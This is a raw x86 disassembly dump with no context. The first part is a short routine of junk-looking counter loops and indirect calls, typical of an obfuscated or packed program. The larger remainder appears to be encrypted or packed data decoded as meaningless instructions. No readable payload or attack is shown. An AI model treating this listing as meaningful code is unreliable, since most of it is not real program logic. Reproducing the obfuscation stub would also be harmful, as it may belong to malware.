  40fe61:	push   DWORD PTR [ebp-0x1c]
  40fe64:	push   0x42a12c
  40fe69:	call   DWORD PTR ds:0x42b2fa
  40fe6f:	mov    ebx,DWORD PTR ds:0x42b1ce
  40fe75:	dec    ebx
  40fe76:	mov    DWORD PTR ds:0x42b1ce,ebx
  40fe7c:	jmp    0x40fe38
  40fe81:	xor    edx,eax
  40fe83:	and    DWORD PTR ds:0x42b196,0x0
  40fe8d:	jmp    0x40fe9f
  40fe92:	mov    ebx,DWORD PTR ds:0x42b196
  40fe98:	inc    ebx
  40fe99:	mov    DWORD PTR ds:0x42b196,ebx
  40fe9f:	cmp    DWORD PTR ds:0x42b196,0x1b
  40fea6:	jae    0x40feef
  40feac:	cmp    DWORD PTR ds:0x42b196,0x6
  40feb3:	jb     0x40feef
  40feb9:	jmp    0x40fece
  40febe:	push   0x42b226
  40fec3:	push   0x42a000
  40fec8:	call   DWORD PTR ds:0x42b2fe
  40fece:	cmp    DWORD PTR ds:0x42b196,0x5
  40fed5:	jne    0x40feea
  40fedb:	xor    ebx,ebx
  40fedd:	add    ebx,DWORD PTR ds:0x42b196
  40fee3:	inc    ebx
  40fee4:	mov    DWORD PTR ds:0x42b196,ebx
  40feea:	jmp    0x40fe92
  40feef:	mov    DWORD PTR [ebp+0x8],edx
  40fef2:	and    DWORD PTR ds:0x42b196,0x0
  40fefc:	jmp    0x40ff10
  40ff01:	xor    ebx,ebx
  40ff03:	xor    ebx,DWORD PTR ds:0x42b196
  40ff09:	inc    ebx
  40ff0a:	mov    DWORD PTR ds:0x42b196,ebx
  40ff10:	cmp    DWORD PTR ds:0x42b196,0x15
  40ff17:	jae    0x40ff62
  40ff1d:	cmp    DWORD PTR ds:0x42b196,0x4
  40ff24:	jb     0x40ff62
  40ff2a:	jmp    0x40ff43
  40ff2f:	push   DWORD PTR [ebp-0xc]
  40ff32:	push   DWORD PTR [ebp-0x1c]
  40ff35:	push   0x42a1d7
  40ff3a:	push   DWORD PTR [ebp-0xc]
  40ff3d:	call   DWORD PTR ds:0x42b306
  40ff43:	cmp    DWORD PTR ds:0x42b196,0x3
  40ff4a:	jne    0x40ff5d
  40ff50:	mov    ebx,DWORD PTR ds:0x42b196
  40ff56:	inc    ebx
  40ff57:	mov    DWORD PTR ds:0x42b196,ebx
  40ff5d:	jmp    0x40ff01
  40ff62:	mov    edx,DWORD PTR [ebp+0x8]
  40ff65:	and    DWORD PTR ds:0x42b21a,0x0
  40ff6f:	jmp    0x40ff81
  40ff74:	mov    ebx,DWORD PTR ds:0x42b21a
  40ff7a:	inc    ebx
  40ff7b:	mov    DWORD PTR ds:0x42b21a,ebx
  40ff81:	cmp    DWORD PTR ds:0x42b21a,0x17
  40ff88:	jae    0x40ffd0
  40ff8e:	cmp    DWORD PTR ds:0x42b21a,0xe
  40ff95:	jb     0x40ffd0
  40ff9b:	jmp    0x40ffb1
  40ffa0:	push   0x42a23f
  40ffa5:	push   DWORD PTR [ebp-0x20]
  40ffa8:	push   DWORD PTR [ebp-0xc]
  40ffab:	call   DWORD PTR ds:0x42b30e
  40ffb1:	cmp    DWORD PTR ds:0x42b21a,0xd
  40ffb8:	jne    0x40ffcb
  40ffbe:	mov    ebx,DWORD PTR ds:0x42b21a
  40ffc4:	inc    ebx
  40ffc5:	mov    DWORD PTR ds:0x42b21a,ebx
  40ffcb:	jmp    0x40ff74
  40ffd0:	mov    ebx,DWORD PTR [ebp-0x58]
  40ffd3:	add    DWORD PTR ds:0x42b20e,0x42b1de
  40ffdd:	add    edx,0x5708e2
  40ffe3:	imul   edx,ebx
  40ffe6:	or     DWORD PTR ds:0x42b1b6,0x7440
  40fff0:	mov    DWORD PTR [ebp-0x58],edx
  40fff3:	sub    DWORD PTR ds:0x42b192,ecx
  40fff9:	jmp    0x412359
  40fffe:	add    al,0x23
  410000:	cld    
  410001:	shl    esp,1
  410003:	mov    al,BYTE PTR [edx]
  410005:	xchg   edx,eax
  410006:	(bad)  
  410009:	retf   0xd6b
  41000c:	xor    eax,0x83af3f70
  410011:	cmp    DWORD PTR [esi],0x5e
  410014:	add    DWORD PTR [ebx-0x444b2bd6],0xffffff8e
  41001b:	(bad)  
  41001d:	das    
  41001e:	jmp    0xfc20:0x488e68cc
  410025:	jp     0x41003a
  410027:	sbb    al,0x27
  410029:	and    eax,0x59ba5833
  41002e:	rcl    BYTE PTR [ecx+0x25],0x6c
  410032:	inc    eax
  410033:	pop    esi
  410034:	and    DWORD PTR [edx],esp
  410036:	jge    0x410065
  410038:	div    BYTE PTR [esi-0x74]
  41003b:	push   0xffaf5220
  410040:	fbld   TBYTE PTR [ebp-0x3d]
  410043:	mov    eax,ds:0x98695dcc
  410048:	xor    BYTE PTR [edi+0x33],ah
  41004b:	pop    ebp
  41004c:	mov    esp,0x29332c87
  410051:	mov    al,ds:0x8d775448
  410056:	cwde   
  410057:	jg     0x410038
  410059:	aas    
  41005a:	je     0x41007f
  41005c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41005d:	out    dx,al
  41005e:	mov    esp,0x36780e65
  410063:	pop    ecx
  410064:	ja     0x410080
  410066:	imul   esi,DWORD PTR [ecx+ebp*2-0x6d5a3da9],0xa2f50a78
  410071:	ins    BYTE PTR es:[edi],dx
  410072:	cli    
  410073:	call   0x5d6f3e8e
  410078:	mov    ah,0xcc
  41007a:	sahf   
  41007b:	sbb    al,0xb6
  41007d:	add    ch,BYTE PTR [ecx+esi*1]
  410080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410081:	fucomp st(1)
  410083:	addr16 loop 0x41002d
  410086:	cs adc eax,0x863acee0
  41008c:	mov    ebx,?
  41008e:	call   0x87b7:0x5adcf391
  410095:	in     al,0x25
  410097:	jecxz  0x4100c2
  410099:	push   0x3
  41009b:	xor    ecx,ecx
  41009d:	bound  eax,QWORD PTR [eax-0x59]
  4100a0:	pop    es
  4100a1:	mov    dh,0x88
  4100a3:	(bad)  
  4100a4:	jne    0x410055
  4100a6:	stos   BYTE PTR es:[edi],al
  4100a7:	cmp    BYTE PTR [esi+0x74],dl
  4100aa:	gs shr edx,1
  4100ad:	mov    ah,0x97
  4100af:	addr16 into 
  4100b1:	in     eax,dx
  4100b2:	test   eax,0xf38d7c31
  4100b7:	inc    ebp
  4100b8:	jge    0x41011e
  4100ba:	ds (bad) 
  4100bc:	jge    0x410104
  4100be:	inc    esi
  4100bf:	test   eax,0x89e05341
  4100c4:	clc    
  4100c5:	and    DWORD PTR [eax+eax*4-0x59b88189],ebx
  4100cc:	mov    dl,dh
  4100ce:	push   edx
  4100cf:	js     0x410057
  4100d1:	adc    ebx,DWORD PTR [eax-0x635f4d1]
  4100d7:	(bad)  
  4100d8:	adc    al,0x29
  4100da:	jns    0x410103
  4100dc:	pop    eax
  4100dd:	and    ebp,DWORD PTR [ebp+0x3ff6c938]
  4100e3:	fld    QWORD PTR [ebp+0x18f34711]
  4100e9:	dec    ecx
  4100ea:	ins    DWORD PTR es:[edi],dx
  4100eb:	test   eax,0x6ca892bd
  4100f0:	xchg   ebp,eax
  4100f1:	pop    eax
  4100f2:	ror    DWORD PTR [ecx+0x7d66fdb9],cl
  4100f8:	in     al,0xc3
  4100fa:	cmp    ch,ch
  4100fc:	pop    es
  4100fd:	(bad)  
  4100fe:	mov    esi,0xe4305699
  410103:	mov    ah,0x62
  410105:	mov    bl,0x9d
  410107:	mov    al,0x85
  410109:	out    dx,eax
  41010a:	in     al,0xea
  41010c:	fcmovnu st,st(2)
  41010e:	repz sub edx,edx
  410111:	mov    esi,0xc7ec3f01
  410116:	(bad)  
  410117:	neg    bl
  410119:	sub    al,bl
  41011b:	adc    eax,0x9bfa4a3
  410120:	pop    ds
  410121:	clc    
  410122:	push   0x3c
  410124:	shl    ah,cl
  410126:	jge    0x41013c
  410128:	xchg   edx,eax
  410129:	inc    edx
  41012a:	add    al,0x70
  41012c:	xchg   ecx,eax
  41012d:	or     BYTE PTR [ecx],bh
  41012f:	cli    
  410130:	inc    esp
  410131:	scas   al,BYTE PTR es:[edi]
  410132:	and    DWORD PTR [ebx+ebp*4+0x2ebbe1b],edx
  410139:	(bad)  
  41013a:	cmc    
  41013b:	stc    
  41013c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41013d:	popa   
  41013e:	clc    
  41013f:	add    esi,esp
  410141:	mov    ch,0xa1
  410143:	cmc    
  410144:	call   0x2216db32
  410149:	add    al,0x53
  41014b:	addr16 pusha 
  41014d:	popa   
  41014e:	pop    DWORD PTR [ebx-0x46]
  410151:	xor    eax,0x2cda3cf1
  410156:	mov    ds:0xaf70dc80,eax
  41015b:	sahf   
  41015c:	jbe    0x4101a8
  41015e:	cli    
  41015f:	into   
  410160:	mov    ch,0x84
  410162:	sti    
  410163:	push   0xffffffdb
  410165:	mov    cl,BYTE PTR [ecx]
  410167:	mov    WORD PTR [eax],ss
  410169:	bound  esi,QWORD PTR [ecx+0x549fd97d]
  41016f:	daa    
  410170:	mov    bh,BYTE PTR [ecx]
  410172:	cmc    
  410173:	mov    eax,ds:0x88f52cd9
  410178:	adc    bh,ch
  41017a:	fst    st(1)
  41017c:	sbb    al,0xa2
  41017e:	clc    
  41017f:	push   eax
  410180:	lds    esi,FWORD PTR [ebx]
  410182:	hlt    
  410183:	jmp    0x410160
  410185:	test   al,0x56
  410188:	pop    esi
  410189:	loope  0x410171
  41018b:	fbstp  TBYTE PTR [esp+edx*8]
  41018e:	jle    0x41019e
  410190:	mov    edi,0x42a39970
  410195:	rcl    DWORD PTR [edi-0x6d],1
  410198:	sub    DWORD PTR [esi+0x72f01efa],edi
  41019e:	add    DWORD PTR [ecx-0x54491ad0],ecx
  4101a4:	xor    BYTE PTR [ebx+0xf],dl
  4101a7:	bsr    eax,esp
  4101aa:	fs jno 0x410197
  4101ad:	dec    ebx
  4101ae:	bound  esp,QWORD PTR [edi-0x26]
  4101b1:	mov    DWORD PTR [esi+0x7e],ebp
  4101b4:	jmp    0x3dc41be7
  4101b9:	aas    
  4101ba:	xchg   esi,eax
  4101bb:	xchg   esi,eax
  4101bc:	bound  ebx,QWORD PTR [edi]
  4101be:	mov    esi,0xc9de6149
  4101c3:	sub    BYTE PTR [ebp+0x671c9ff7],dl
  4101c9:	xchg   esp,eax
  4101ca:	shl    BYTE PTR [edx-0x685535a7],1
  4101d0:	imul   ebx,DWORD PTR [edx+0x102f25bc],0x6e
  4101d7:	adc    eax,0xbf39063f
  4101dc:	xchg   DWORD PTR ds:0x1014a4f5,ebx
  4101e2:	cmc    
  4101e3:	xchg   esi,eax
  4101e4:	fabs   
  4101e6:	js     0x410246
  4101e8:	jmp    DWORD PTR [ebp-0x57]
  4101eb:	nop
  4101ec:	lock cmp cl,bh
  4101ef:	cmp    al,0x3
  4101f1:	fbstp  TBYTE PTR [ecx+0x70]
  4101f4:	sub    al,0x4f
  4101f6:	stc    
  4101f7:	xchg   esi,eax
  4101f8:	or     eax,0x887768c5
  4101fd:	push   eax
  4101fe:	adc    al,0xff
  410200:	xchg   di,ax
  410202:	leave  
  410203:	push   0xffffffba
  410205:	jb     0x4101b0
  410207:	push   es
  410208:	add    edi,DWORD PTR [ecx-0x1b587a1c]
  41020e:	test   eax,0x312a3a87
  410213:	mov    eax,0xdc9c0003
  410218:	xlat   BYTE PTR ds:[ebx]
  410219:	jl     0x41027d
  41021b:	fcmovnbe st,st(2)
  41021d:	stc    
  41021e:	das    
  41021f:	inc    esp
  410220:	nop
  410221:	jno    0x410211
  410223:	jmp    0x4f43:0x1bb6e3af
  41022a:	imul   edx,DWORD PTR [edi+0x854db96],0xffffff81
  410231:	fiadd  DWORD PTR [esi-0x5e828113]
  410237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410238:	add    al,0x9f
  41023a:	je     0x4101fd
  41023c:	loopne 0x41025e
  41023e:	sub    DWORD PTR [ebx-0x39],0x83070340
  410245:	or     bh,BYTE PTR [ebp+0x376811d8]
  41024b:	push   edx
  41024c:	xlat   BYTE PTR cs:[ebx]
  41024e:	mov    bh,cl
  410250:	sub    al,bh
  410252:	or     BYTE PTR [ecx],0xf3
  410255:	(bad)  
  410256:	retf   
  410257:	repnz pop ss
  410259:	sub    ebp,ecx
  41025b:	xor    BYTE PTR [edi+0x57b8242a],dh
  410261:	adc    al,BYTE PTR [edx-0x5]
  410264:	call   0x5353:0x77be0c6c
  41026b:	fadd   DWORD PTR [eax]
  41026d:	mov    esp,esp
  41026f:	jp     0x410221
  410271:	aad    0xaf
  410273:	inc    DWORD PTR [eax+eax*2+0x68562da2]
  41027a:	mov    cl,0xd6
  41027c:	daa    
  41027d:	ret    0xda04
  410280:	shl    DWORD PTR [ebx+0x45f66885],cl
  410286:	mov    WORD PTR [esi],fs
  410288:	out    dx,al
  410289:	loopne 0x4102bd
  41028b:	jge    0x410288
  41028d:	jnp    0x4102e7
  41028f:	test   edi,0xf42a2944
  410295:	hlt    
  410296:	push   esi
  410297:	(bad)  
  410299:	je     0x4102af
  41029b:	enter  0xe712,0xb4
  41029f:	dec    ebx
  4102a0:	fwait
  4102a1:	sbb    bl,BYTE PTR [ebx+0x27]
  4102a4:	ffree  st(6)
  4102a6:	mov    dl,0xc1
  4102a8:	icebp  
  4102a9:	ret    
  4102aa:	pop    eax
  4102ab:	jbe    0x410265
  4102ad:	xchg   edx,eax
  4102ae:	dec    ebp
  4102af:	jge    0x41024b
  4102b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102b2:	lods   al,BYTE PTR ds:[esi]
  4102b3:	out    0x1b,eax
  4102b5:	(bad)
  4102b9:	pop    ds
  4102ba:	ja     0x4102b2
  4102bc:	das    
  4102bd:	sahf   
  4102be:	pop    ebx
  4102bf:	test   al,0xd8
  4102c1:	mov    al,ds:0x1b918d71
  4102c6:	std    
  4102c7:	jmp    0xb0f33ec7
  4102cc:	cwde   
  4102cd:	xor    esp,esi
  4102cf:	push   ss
  4102d0:	syscall 
  4102d2:	mov    dh,0xab
  4102d4:	pop    esp
  4102d5:	out    0xf1,al
  4102d7:	stc    
  4102d8:	and    eax,0x82f025ad
  4102dd:	add    bh,dl
  4102df:	mov    esi,DWORD PTR [edi-0x3954441e]
  4102e5:	adc    ebp,DWORD PTR [edi-0x55]
  4102e8:	mov    DWORD PTR [edi+0x56],esp
  4102eb:	data16 in al,0x79
  4102ee:	sub    al,0xcb
  4102f0:	push   cs
  4102f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f2:	mov    BYTE PTR ds:0x4c78e651,bh
  4102f8:	xor    ebx,DWORD PTR [esp+ebx*4]
  4102fb:	mov    DWORD PTR [edi-0x7563c04c],edi
  410301:	dec    ecx
  410302:	pop    ebp
  410303:	fld    DWORD PTR ds:[edi+0x2c]
  410307:	nop
  410308:	mov    ebp,0xf18b4ecd
  41030d:	lock adc BYTE PTR [esi+0x51],bh
  410311:	or     eax,0x2fa1ea38
  410316:	or     al,0x1a
  410318:	xlat   BYTE PTR ds:[ebx]
  410319:	jne    0x41033e
  41031b:	sub    eax,0x9608bac0
  410320:	lahf   
  410321:	shl    DWORD PTR [ebp+0xa],1
  410324:	rol    DWORD PTR [esi+0x1a318b86],0xe5
  41032b:	add    ah,BYTE PTR [edi]
  41032d:	ficomp DWORD PTR [edx+edx*8]
  410330:	add    al,cl
  410332:	pop    esp
  410333:	pop    ss
  410334:	in     eax,0x66
  410336:	ret    0xfbda
  410339:	xor    ebp,eax
  41033b:	jb     0x410381
  41033d:	pop    es
  41033e:	data16 sub BYTE PTR [edx],cl
  410341:	or     DWORD PTR [edx+eax*4],0xfffffffa
  410345:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  410347:	aas    
  410348:	test   DWORD PTR [ebx+edi*2-0x14],esp
  41034c:	xor    bh,BYTE PTR [ebx+0x15]
  41034f:	std    
  410350:	sti    
  410351:	inc    edx
  410352:	inc    esp
  410353:	add    ecx,ebx
  410355:	ret    
  410356:	push   ss
  410357:	push   cs
  410358:	mov    ebx,0x67e646e4
  41035d:	imul   esp,DWORD PTR [ecx-0xa3231e6],0xb0f1bb91
  410367:	adc    BYTE PTR [eax],0x13
  41036a:	out    0x7,eax
  41036c:	dec    eax
  41036d:	mov    dl,0x42
  41036f:	jl     0x41037b
  410371:	jnp    0x41036e
  410373:	jmp    0x58fe:0x8a82ea3c
  41037a:	cmp    al,0xcd
  41037c:	jp     0x410353
  41037e:	mov    al,0xe
  410380:	push   ecx
  410381:	(bad)  
  410382:	pop    ebp
  410383:	shr    BYTE PTR [ebx+0x6e],1
  410386:	inc    eax
  410387:	popa   
  410388:	add    ebp,DWORD PTR [edi]
  41038a:	or     edx,ebp
  41038c:	scas   al,BYTE PTR es:[edi]
  41038d:	mov    cl,0xb9
  41038f:	or     BYTE PTR [ebp+0x17],dh
  410392:	push   0xc24ee989
  410397:	jl     0x4103f8
  410399:	push   cs
  41039a:	cmc    
  41039b:	sahf   
  41039c:	ret    0x951d
  41039f:	xchg   DWORD PTR [ebp+0xe],ecx
  4103a2:	test   bh,0x53
  4103a5:	jns    0x410328
  4103a7:	stc    
  4103a8:	aad    0xae
  4103aa:	test   DWORD PTR [edx-0x31],esi
  4103ad:	gs fwait
  4103af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103b0:	sti    
  4103b1:	sub    cl,BYTE PTR cs:[ecx+0x24d7705e]
  4103b8:	es aad 0x16
  4103bb:	scas   al,BYTE PTR es:[edi]
  4103bc:	xor    cl,BYTE PTR [edx-0x42]
  4103bf:	or     dh,cl
  4103c1:	xchg   ecx,eax
  4103c2:	dec    ecx
  4103c3:	cmp    BYTE PTR [edx],cl
  4103c5:	push   ecx
  4103c6:	lods   eax,DWORD PTR ds:[esi]
  4103c7:	(bad)  
  4103c8:	mov    eax,0xcd51b988
  4103cd:	or     DWORD PTR [ebx-0x5d565e73],0xfffffff6
  4103d4:	or     esi,DWORD PTR [eax-0x132834e3]
  4103da:	imul   ebx,DWORD PTR [eax-0x701d00d2],0x53
  4103e1:	pop    ss
  4103e2:	sbb    dl,al
  4103e4:	pop    ecx
  4103e5:	push   es
  4103e6:	or     eax,0x39ac69cb
  4103eb:	retf   0x9dd6
  4103ee:	mov    dl,0x69
  4103f0:	push   esp
  4103f1:	ss mov edi,0xbc5e39df
  4103f7:	mov    edx,0xe5a6eebd
  4103fc:	xor    eax,0xb175ee6a
  410401:	adc    BYTE PTR [edx-0x3942ce26],0xf2
  410408:	leave  
  410409:	out    0xc4,eax
  41040b:	int    0x8c
  41040d:	add    eax,0xdeb265d3
  410412:	pop    ss
  410413:	rcl    ah,1
  410415:	inc    esi
  410416:	push   ebp
  410417:	xchg   esp,eax
  410418:	and    eax,0xf6afdbfe
  41041d:	sub    DWORD PTR [esi+0x1d],0xba6f9016
  410424:	mov    ah,0x5a
  410426:	dec    edi
  410427:	imul   edi,DWORD PTR [edx-0x76],0x6746651c
  41042e:	mov    ds:0x30a621af,eax
  410433:	shr    esp,0x1b
  410436:	sbb    bl,BYTE PTR [eax]
  410438:	loopne 0x410483
  41043a:	mov    bh,0xe6
  41043c:	js     0x4103e3
  41043e:	ja     0x410422
  410440:	and    DWORD PTR [ecx+0x523d8e79],esp
  410446:	xor    bh,ch
  410448:	pop    esp
  410449:	(bad)  
  41044a:	rcr    BYTE PTR [edx+ecx*8-0x1],1
  41044e:	jmp    0x3030:0x1877985c
  410455:	add    bl,0xfc
  410458:	ja     0x4104c4
  41045a:	push   edi
  41045b:	loopne 0x4104a3
  41045d:	xchg   BYTE PTR ds:0xb68d8962,al
  410463:	pop    edi
  410464:	cmc    
  410465:	call   0x8899:0xb9c28051
  41046c:	fcom   DWORD PTR [ebx+edi*2]
  41046f:	sbb    al,0x2c
  410471:	mov    edi,DWORD PTR [edi-0x6ff89543]
  410477:	dec    ebx
  410478:	mov    DWORD PTR [edx],ebp
  41047a:	lea    edx,[esi+0xe]
  41047d:	and    bl,dh
  41047f:	push   cs
  410480:	xchg   ebp,eax
  410481:	xor    al,0x94
  410483:	jle    0x41040d
  410485:	cmp    BYTE PTR ds:0x8e1b2725,0x5
  41048c:	mov    ah,BYTE PTR [edi-0x10]
  41048f:	xchg   esp,eax
  410490:	(bad)  [edi+0x59]
  410493:	stos   DWORD PTR es:[edi],eax
  410494:	push   ss
  410495:	(bad)  
  410496:	std    
  410497:	jge    0x410505
  410499:	daa    
  41049a:	xor    al,0xa7
  41049c:	test   cl,ah
  41049e:	jl     0x41048b
  4104a0:	sub    cl,dh
  4104a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a3:	out    0x47,al
  4104a5:	sar    ah,0xc8
  4104a8:	ss push es
  4104aa:	xor    ah,bh
  4104ac:	outs   dx,BYTE PTR ds:[esi]
  4104ad:	sub    DWORD PTR [eax+0x1f],ebx
  4104b0:	push   ebp
  4104b1:	inc    edi
  4104b2:	adc    DWORD PTR [eax+0x265d75e3],0xec6fc337
  4104bc:	pushf  
  4104bd:	add    ch,BYTE PTR [ecx+0x60]
  4104c0:	inc    edi
  4104c1:	mov    cl,0xc
  4104c3:	adc    al,0xfe
  4104c5:	xor    ebx,DWORD PTR [ebx+0x1]
  4104c8:	push   edx
  4104c9:	scas   al,BYTE PTR es:[edi]
  4104ca:	(bad)  
  4104cc:	add    eax,DWORD PTR [esi+0x5782b098]
  4104d2:	cli    
  4104d3:	push   eax
  4104d4:	or     esi,DWORD PTR [esi+esi*4+0x659dea15]
  4104db:	shr    BYTE PTR [edx-0x1bf8a0e],cl
  4104e1:	fwait
  4104e2:	sbb    cl,ch
  4104e4:	mov    DWORD PTR [edi],ecx
  4104e6:	push   esp
  4104e7:	loope  0x4104f2
  4104e9:	mov    edx,DWORD PTR [edi]
  4104eb:	das    
  4104ec:	push   edi
  4104ed:	lahf   
  4104ee:	iret   
  4104ef:	and    esp,DWORD PTR [esi+0x31d4c055]
  4104f5:	pop    ss
  4104f6:	sub    BYTE PTR [ebx-0x6f53cfb0],al
  4104fc:	add    edi,DWORD PTR [edi+0x70]
  4104ff:	mov    eax,0x8b90394e
  410504:	popf   
  410505:	aaa    
  410506:	or     cl,BYTE PTR [edx+0x52f92d2a]
  41050c:	xchg   esi,eax
  41050d:	push   es
  41050e:	das    
  41050f:	sub    eax,0xcc14e07d
  410514:	aaa    
  410515:	loop   0x41058f
  410517:	cmp    BYTE PTR [edi],cl
  410519:	push   ss
  41051a:	stos   BYTE PTR es:[edi],al
  41051b:	out    0x4b,al
  41051d:	mov    dh,0x4d
  41051f:	int3   
  410520:	dec    edx
  410521:	push   ecx
  410522:	xor    DWORD PTR [ebx],esp
  410524:	jb     0x410507
  410526:	rcl    BYTE PTR [ebx+ecx*1+0x69c64d54],0xc9
  41052e:	inc    ecx
  41052f:	jbe    0x410519
  410531:	push   cs
  410532:	mov    DWORD PTR [edi-0x74],edi
  410535:	es jno 0x4104c9
  410538:	lock dec ebp
  41053a:	nop
  41053b:	cli    
  41053c:	xchg   edi,eax
  41053d:	fcomp  QWORD PTR [ecx-0x9]
  410540:	sbb    al,0xb0
  410542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410543:	jp     0x4104ce
  410545:	push   0xffffffe3
  410547:	xchg   DWORD PTR [ebx*2-0x475fbcfe],edi
  41054e:	pusha  
  41054f:	jmp    0x71cf:0x20bafd87
  410556:	icebp  
  410557:	test   eax,0xa23dd1a9
  41055c:	dec    eax
  41055d:	rcl    dl,0x9d
  410560:	add    DWORD PTR [edx-0x50],esi
  410563:	pop    es
  410564:	test   BYTE PTR [esi],0xf0
  410567:	xchg   ecx,eax
  410568:	test   BYTE PTR [eax],al
  41056a:	cwde   
  41056b:	ret    0xf5a7
  41056e:	cmp    dh,ch
  410570:	cli    
  410571:	sub    esi,DWORD PTR [esi-0x2d]
  410574:	mov    esi,edx
  410576:	push   edi
  410577:	jmp    0xb8d6d337
  41057c:	outs   dx,DWORD PTR ds:[esi]
  41057d:	popa   
  41057e:	(bad)  
  41057f:	sub    edi,DWORD PTR [eax]
  410581:	out    dx,eax
  410582:	xlat   BYTE PTR ds:[ebx]
  410583:	(bad)  
  410585:	(bad)  
  410586:	dec    ebp
  410587:	sub    BYTE PTR ss:[esi-0x75],0x73
  41058c:	and    BYTE PTR [ecx],bh
  41058e:	jp     0x41060e
  410590:	in     al,0x0
  410592:	pop    esi
  410593:	xchg   ebx,eax
  410594:	and    cl,BYTE PTR [ecx]
  410596:	sub    DWORD PTR [esi+0x10],edi
  410599:	inc    esp
  41059a:	push   edx
  41059b:	(bad)  
  41059c:	sub    al,0x17
  41059e:	sbb    ah,cl
  4105a0:	adc    eax,0x11ead5e9
  4105a5:	jp     0x410619
  4105a7:	adc    DWORD PTR [ebp-0x126333a1],edx
  4105ad:	pop    esp
  4105ae:	and    ebp,DWORD PTR [edx+0x27addce2]
  4105b4:	out    0xf1,al
  4105b6:	jnp    0x410637
  4105b8:	ud2    
  4105ba:	imul   edi,DWORD PTR ds:0x59f2f48f,0xd747be61
  4105c4:	shl    BYTE PTR [ebp-0x1e39bfa7],1
  4105ca:	iret   
  4105cb:	cmp    ebx,DWORD PTR [esi-0x12]
  4105ce:	(bad)  
  4105cf:	mov    ch,0x3d
  4105d1:	stos   DWORD PTR es:[edi],eax
  4105d2:	mov    dl,0xed
  4105d4:	jge    0x410579
  4105d6:	cwde   
  4105d7:	dec    cx
  4105d9:	mov    ebp,0xc57e8255
  4105de:	mov    WORD PTR [edi+0x53],es
  4105e1:	arpl   WORD PTR [ecx+0x2f0ed43],ax
  4105e7:	out    0xa,al
  4105e9:	inc    ecx
  4105ea:	ret    0xdfe1
  4105ed:	out    0xb4,al
  4105ef:	jnp    0x4105a7
  4105f1:	retf   0xca09
  4105f4:	xor    DWORD PTR [eax],edi
  4105f6:	test   eax,0xafcebc46
  4105fc:	pop    eax
  4105fd:	mov    bh,0x5f
  4105ff:	xchg   ecx,eax
  410600:	rcr    al,0x9d
  410603:	mov    dl,0x8b
  410605:	cli    
  410606:	mov    ah,0xea
  410608:	jno    0x410608
  41060a:	mov    al,bh
  41060c:	adc    dh,dh
  41060e:	pop    ds
  41060f:	jnp    0x410622
  410611:	jne    0x4105ac
  410613:	mov    ch,0x88
  410615:	outs   dx,DWORD PTR ds:[esi]
  410616:	fstp   QWORD PTR [edi-0x12]
  410619:	xchg   edi,eax
  41061a:	in     al,dx
  41061b:	repnz jecxz 0x410664
  41061e:	fsubr  st,st(6)
  410620:	nop
  410621:	adc    eax,0x97983d40
  410626:	test   al,0x80
  410628:	loopne 0x410666
  41062a:	jne    0x4105cf
  41062c:	leave  
  41062d:	sti    
  41062e:	add    BYTE PTR [edx-0x6fe07df3],dh
  410634:	push   ss
  410635:	xchg   esi,eax
  410636:	aaa    
  410637:	push   esi
  410638:	out    0x97,al
  41063a:	ds in  eax,0x93
  41063d:	pop    ebx
  41063e:	pop    ebx
  41063f:	and    al,0x9
  410641:	jae    0x41068a
  410643:	in     al,0xa2
  410645:	sbb    ecx,DWORD PTR [ecx+0x36]
  410648:	add    eax,0x52bf47d2
  41064d:	dec    ecx
  41064e:	sti    
  41064f:	mov    ah,ah
  410651:	in     al,dx
  410652:	and    dh,al
  410654:	xor    esi,DWORD PTR [esi+0x2b]
  410657:	idiv   BYTE PTR [ebx+0x5b8ed9e3]
  41065d:	or     eax,DWORD PTR [eax]
  41065f:	addr16 gs dec esp
  410662:	mov    ecx,0xe315f93a
  410667:	enter  0xc135,0xb4
  41066b:	(bad)  
  41066c:	xlat   BYTE PTR ds:[ebx]
  41066d:	mov    edx,0xff03454c
  410672:	mov    esp,0x8767c577
  410677:	dec    ecx
  410678:	mov    dh,0x9
  41067a:	lds    ecx,FWORD PTR [ebx]
  41067c:	mov    edi,0xbfcfbd1b
  410681:	add    ebp,edx
  410683:	and    BYTE PTR [ebp-0x60dc0156],0x66
  41068a:	or     al,0x47
  41068c:	cmp    al,0xdd
  41068e:	in     al,dx
  41068f:	cmp    DWORD PTR [ecx],eax
  410691:	sahf   
  410692:	ret    
  410693:	mov    bh,ah
  410695:	ins    BYTE PTR es:[edi],dx
  410696:	out    0x18,eax
  410698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410699:	aaa    
  41069a:	dec    ebp
  41069b:	ror    ecx,1
  41069d:	xchg   esi,eax
  41069e:	or     al,0xf6
  4106a0:	inc    edi
  4106a1:	adc    dh,ch
  4106a3:	cmp    DWORD PTR [ebp-0x72],esi
  4106a6:	mov    bh,0xc3
  4106a8:	mov    ds:0xec2526e9,al
  4106ad:	(bad)  
  4106ae:	retf   0xb18a
  4106b1:	loope  0x410691
  4106b3:	gs dec ebx
  4106b5:	lahf   
  4106b6:	inc    ecx
  4106b7:	mov    fs:0x8d00094d,al
  4106bd:	mov    ds:0x740ccdee,eax
  4106c2:	pusha  
  4106c3:	popf   
  4106c4:	pop    ebp
  4106c5:	and    al,0x3f
  4106c7:	inc    edi
  4106c8:	mov    cl,0xd5
  4106ca:	test   ah,ah
  4106cc:	push   cs
  4106cd:	leave  
  4106ce:	cwde   
  4106cf:	add    ecx,DWORD PTR [edx-0x56]
  4106d2:	cld    
  4106d3:	add    eax,0x4e7d1115
  4106d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106d9:	popf   
  4106da:	xor    ebp,DWORD PTR [esi+0x6b]
  4106dd:	scas   eax,DWORD PTR es:[edi]
  4106de:	sbb    DWORD PTR [edi+0x7c],ebx
  4106e1:	xor    BYTE PTR [edi+eiz*2-0x4cc54f99],bl
  4106e8:	sti    
  4106e9:	inc    ecx
  4106ea:	adc    DWORD PTR [ebx+0x4758adf],ebx
